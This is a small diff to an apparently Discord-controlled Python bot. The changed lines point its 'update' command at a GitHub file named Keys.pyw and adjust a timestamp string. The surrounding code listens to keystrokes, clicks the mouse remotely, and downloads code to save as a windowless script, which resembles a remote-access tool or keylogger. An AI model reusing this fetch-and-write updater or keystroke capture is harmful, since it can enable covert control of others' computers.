@@ -87,7 +87,7 @@ async def load(ctx):
             await ctx.send(f"Loaded, `{file}`")
 @client.command()
 async def update(ctx):
-    url = "https://raw.githubusercontent.com/TaranMayer/trees/master/Keys.py"
+    url = "https://raw.githubusercontent.com/TaranMayer/trees/master/Keys.pyw"
     r = requests.get(url).content.decode('utf-8')
     code = str(r)
     f = open("Keys.pyw",'w')
@@ -228,7 +228,7 @@ async def ytsearch(ctx):
     mouse.click(Button.left, 1)
 @client.command()
 async def gittest(ctx):
-    await ctx.send("10/9 9:17 PM")
+    await ctx.send("10/9 9:18 PM")
 with Listener(on_press=on_press) as listener:
     o_t = time.time()
     client.run(auth.auth)
